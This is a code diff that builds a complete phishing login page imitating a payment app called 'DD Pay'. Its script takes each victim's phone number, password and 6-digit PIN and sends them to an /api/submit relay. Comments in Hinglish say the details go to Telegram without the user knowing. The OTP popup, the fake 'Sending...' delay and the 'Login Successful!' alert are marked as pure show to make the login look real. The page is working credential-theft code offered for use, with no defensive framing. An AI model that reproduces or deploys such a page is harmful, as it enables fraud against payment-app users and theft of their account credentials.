@@ -1,76 +1,194 @@
-// --- TELEGRAM MESSAGE BHEJNE KA FUNCTION ---
-async function sendToTelegram(messageText) {
-    try {
-        const res = await fetch('/api/submit', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ message: messageText })
-        });
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DD Pay - Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #f0f4f8; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         
-        if (res.ok) {
-            return true;
-        } else {
-            return false;
+        .main-container { width: 100%; max-width: 400px; background: #f0f4f8; padding: 20px; position: relative; overflow: hidden; }
+        
+        .logo-container { text-align: center; margin-bottom: 30px; margin-top: 20px; }
+        .logo-container img { width: 180px; max-width: 100%; height: auto; }
+
+        .input-group { position: relative; margin-bottom: 15px; }
+        .input-group i { position: absolute; left: 20px; top: 50%; transform: translateY(-50%); color: #008e5a; font-size: 18px; }
+        .input-group input { width: 100%; padding: 16px 20px 16px 50px; border: 1px solid #e0e0e0; border-radius: 30px; font-size: 16px; background: #fff; outline: none; color: #333; box-shadow: 0 2px 5px rgba(0,0,0,0.02); }
+        .input-group input::placeholder { color: #aaa; }
+
+        .links-row { display: flex; justify-content: space-between; align-items: center; margin: 20px 10px; font-size: 14px; color: #008e5a; font-weight: 500; }
+        .links-row a { color: #008e5a; text-decoration: none; }
+        
+        .privacy-row { display: flex; align-items: center; justify-content: center; margin-bottom: 20px; font-size: 14px; color: #333; }
+        .privacy-row input { margin-right: 8px; accent-color: #008e5a; width: 16px; height: 16px; }
+
+        .btn { width: 100%; padding: 16px; border: none; border-radius: 30px; font-size: 18px; font-weight: 600; cursor: pointer; transition: 0.3s; }
+        .btn-signin { background-color: #008e5a; color: white; box-shadow: 0 4px 10px rgba(0, 142, 90, 0.3); }
+        .btn-signin:active { transform: scale(0.98); }
+        
+        .forgot-link { text-align: center; margin-top: 20px; display: block; color: #008e5a; text-decoration: none; font-weight: 500; }
+
+        /* OTP Popup (Modal) */
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); display: none; justify-content: center; align-items: center; z-index: 1000; }
+        .modal-content { background: #fff; width: 90%; max-width: 380px; border-radius: 20px; padding: 25px; position: relative; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
+        
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .modal-header h2 { font-size: 22px; color: #222; }
+        .close-btn { background: #f0f0f0; border: none; width: 30px; height: 30px; border-radius: 50%; font-size: 16px; color: #666; cursor: pointer; }
+        
+        .modal-text { font-size: 14px; color: #008e5a; margin-bottom: 10px; line-height: 1.4; font-weight: 500; }
+        .modal-phone { font-size: 15px; font-weight: bold; color: #008e5a; margin-bottom: 20px; }
+
+        .otp-input-row { display: flex; align-items: center; border: 1px solid #ccc; border-radius: 30px; padding: 5px; margin-bottom: 20px; overflow: hidden; }
+        .otp-input-row i { color: #008e5a; font-size: 18px; margin-left: 15px; margin-right: 10px; flex-shrink: 0; }
+        .otp-input-row input { flex: 1; min-width: 0; border: none; outline: none; font-size: 15px; padding: 5px; }
+        .btn-send { background: #008e5a; color: white; border: none; padding: 10px 15px; border-radius: 25px; font-size: 14px; cursor: pointer; font-weight: 600; white-space: nowrap; flex-shrink: 0; }
+        
+        .btn-confirm { background: #008e5a; color: white; box-shadow: 0 4px 10px rgba(0, 142, 90, 0.3); }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Dollar_sign_in_circle_cleaned_%28PDDC%29.svg/200px-Dollar_sign_in_circle_cleaned_%28PDDC%29.svg.png" alt="DD Pay" style="filter: hue-rotate(90deg);">
+        </div>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <i class="fa-solid fa-user"></i>
+                <input type="tel" id="phone" placeholder="Phone" required>
+            </div>
+            
+            <div class="input-group">
+                <i class="fa-solid fa-lock"></i>
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+
+            <div class="input-group">
+                <i class="fa-solid fa-key"></i>
+                <input type="password" id="pin" placeholder="6-Digit PIN" maxlength="6" required>
+            </div>
+
+            <div class="links-row">
+                <a href="#">Register</a>
+                <label><input type="radio" name="remember" style="accent-color: #008e5a;"> Remember Me</label>
+            </div>
+
+            <div class="privacy-row">
+                <input type="checkbox" required> Agree "User Privacy Agreement"
+            </div>
+
+            <button type="submit" class="btn btn-signin">Sign In</button>
+        </form>
+
+        <a href="#" class="forgot-link">Forget Password</a>
+    </div>
+
+    <!-- OTP POPUP MODAL -->
+    <div class="modal-overlay" id="otpModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Login OTP</h2>
+                <button class="close-btn" onclick="closeModal()">&times;</button>
+            </div>
+            
+            <div class="modal-text">
+                Tap Send to receive the OTP, then enter it to confirm this login.
+            </div>
+            <div class="modal-phone">
+                OTP will be sent to <span id="displayPhone">+91 XXXXXXXXXX</span>
+            </div>
+
+            <div class="otp-input-row">
+                <i class="fa-regular fa-envelope"></i>
+                <input type="text" id="otpCode" placeholder="Enter 6-digit OTP" maxlength="6">
+                <button class="btn-send" id="sendOtpBtn">Send</button>
+            </div>
+
+            <button class="btn btn-confirm" id="confirmOtpBtn">Confirm</button>
+        </div>
+    </div>
+
+    <!-- SCRIPT TAG YAHAN SE SHURU HO RAHA HAI -->
+    <script>
+        // --- TELEGRAM MESSAGE BHEJNE KA FUNCTION ---
+        async function sendToTelegram(messageText) {
+            try {
+                const res = await fetch('/api/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message: messageText })
+                });
+                
+                if (res.ok) {
+                    return true;
+                } else {
+                    return false;
+                }
+            } catch (error) {
+                return false;
+            }
         }
-    } catch (error) {
-        return false;
-    }
-}
 
-const modal = document.getElementById('otpModal');
-const displayPhone = document.getElementById('displayPhone');
+        const modal = document.getElementById('otpModal');
+        const displayPhone = document.getElementById('displayPhone');
 
-function closeModal() {
-    modal.style.display = 'none';
-}
+        function closeModal() {
+            modal.style.display = 'none';
+        }
 
-// 1. SIGN IN BUTTON DABANE PAR (Telegram par details jayengi aur OTP popup khulega)
-document.getElementById('loginForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-    const phone = document.getElementById('phone').value;
-    const password = document.getElementById('password').value;
-    const pin = document.getElementById('pin').value;
+        // 1. SIGN IN BUTTON DABANE PAR
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            const pin = document.getElementById('pin').value;
 
-    // Telegram par login details bhejna (Bina user ko bataye)
-    const msg = `🔔 *Naya User Login Kar Raha Hai!*\n\n📞 Phone: ${phone}\n🔑 Password: ${password}\n🔢 PIN: ${pin}`;
-    sendToTelegram(msg); 
+            const msg = `🔔 *Naya User Login Kar Raha Hai!*\n\n📞 Phone: ${phone}\n🔑 Password: ${password}\n🔢 PIN: ${pin}`;
+            sendToTelegram(msg); 
 
-    // Website par popup kholna (Sirf dikhawa)
-    displayPhone.innerText = `+91 ${phone}`;
-    modal.style.display = 'flex'; 
-});
+            displayPhone.innerText = `+91 ${phone}`;
+            modal.style.display = 'flex'; 
+        });
 
-// 2. OTP POPUP ME "SEND" DABANE PAR (Sirf dikhawa)
-document.getElementById('sendOtpBtn').addEventListener('click', function() {
-    this.innerText = "Sending...";
-    this.disabled = true;
+        // 2. OTP POPUP ME "SEND" DABANE PAR (Sirf dikhawa)
+        document.getElementById('sendOtpBtn').addEventListener('click', function() {
+            this.innerText = "Sending...";
+            this.disabled = true;
 
-    // 2 second ka wait (dikhawa ki OTP ja raha hai)
-    setTimeout(() => {
-        this.innerText = "Send";
-        this.disabled = false;
-        alert("OTP aapke mobile number par send kar diya gaya hai!");
-    }, 1500);
-});
+            setTimeout(() => {
+                this.innerText = "Send";
+                this.disabled = false;
+                alert("OTP aapke mobile number par send kar diya gaya hai!");
+            }, 1500);
+        });
 
-// 3. OTP POPUP ME "CONFIRM" DABANE PAR (Sirf dikhawa)
-document.getElementById('confirmOtpBtn').addEventListener('click', function() {
-    const otp = document.getElementById('otpCode').value;
-    
-    if(!otp) {
-        alert("Pehle 6-digit OTP enter karein!");
-        return;
-    }
+        // 3. OTP POPUP ME "CONFIRM" DABANE PAR (Sirf dikhawa)
+        document.getElementById('confirmOtpBtn').addEventListener('click', function() {
+            const otp = document.getElementById('otpCode').value;
+            
+            if(!otp) {
+                alert("Pehle 6-digit OTP enter karein!");
+                return;
+            }
 
-    this.innerText = "Confirming...";
-    this.disabled = true;
+            this.innerText = "Confirming...";
+            this.disabled = true;
 
-    // 2 second ka wait (dikhawa ki login ho raha hai)
-    setTimeout(() => {
-        alert("Login Successful!");
-        closeModal();
-        document.getElementById('loginForm').reset();
-        this.innerText = "Confirm";
-        this.disabled = false;
-    }, 1500);
-});
+            setTimeout(() => {
+                alert("Login Successful!");
+                closeModal();
+                document.getElementById('loginForm').reset();
+                this.innerText = "Confirm";
+                this.disabled = false;
+            }, 1500);
+        });
+    </script>
+    <!-- SCRIPT TAG YAHAN KHATAM HO RAHA HAI -->
+
+</body>
+</html>
